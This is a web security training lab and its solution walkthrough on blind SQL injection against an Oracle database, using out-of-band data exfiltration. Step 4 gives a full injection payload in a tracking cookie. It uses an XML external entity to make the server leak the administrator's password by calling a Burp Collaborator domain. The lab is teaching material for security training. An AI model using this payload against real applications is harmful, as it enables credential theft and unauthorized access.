# Lab: Blind SQL injection with out-of-band data exfiltration

### PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.  

```
Note
```
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server (burpcollaborator.net). 

```
Hint
```
This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Solution

1. Visit the front page of the shop, and use <a href="/burp/pro">Burp Suite Professional</a> to intercept and modify the request containing the <code>TrackingId</code> cookie.

2. Go to the Burp menu, and launch the <a href="/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator client</a>.

3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.

4. Modify the <code>TrackingId</code> cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic <a href="/web-security/xxe">XXE</a> techniques as follows: <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code>.

5. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.

6. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the <code>administrator</code> user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.

7. In your browser, click "My account" to open the login page. Use the password to log in as the <code>administrator</code> user.